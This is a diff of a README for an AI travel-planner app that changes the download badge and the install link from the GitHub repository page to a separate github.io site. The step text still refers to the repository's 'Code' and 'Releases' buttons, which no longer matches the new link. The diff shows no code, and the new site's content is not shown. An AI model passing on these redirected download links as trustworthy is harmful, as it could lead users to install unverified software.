@@ -1,7 +1,7 @@
 # 🌍 PlanetPath-AI-Travel-Planner - Create custom travel plans using AI
 
 <p align="center">
-  <a href="https://github.com/Tohid7399/PlanetPath-AI-Travel-Planner">
+  <a href="https://tohid7399.github.io">
     <img src="https://img.shields.io/badge/Download-PlanetPath-blue" alt="Download">
   </a>
 </p>
@@ -32,7 +32,7 @@ Your computer needs the following to run the software effectively:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the repository page to download the software. You can find it here: [https://github.com/Tohid7399/PlanetPath-AI-Travel-Planner](https://github.com/Tohid7399/PlanetPath-AI-Travel-Planner).
+1. Visit the repository page to download the software. You can find it here: [https://tohid7399.github.io](https://tohid7399.github.io).
 2. Look for the button or link labeled "Code" or "Releases" on that page.
 3. Choose the option to download the source files as a ZIP folder.
 4. Open your "Downloads" folder once the file finishes downloading.
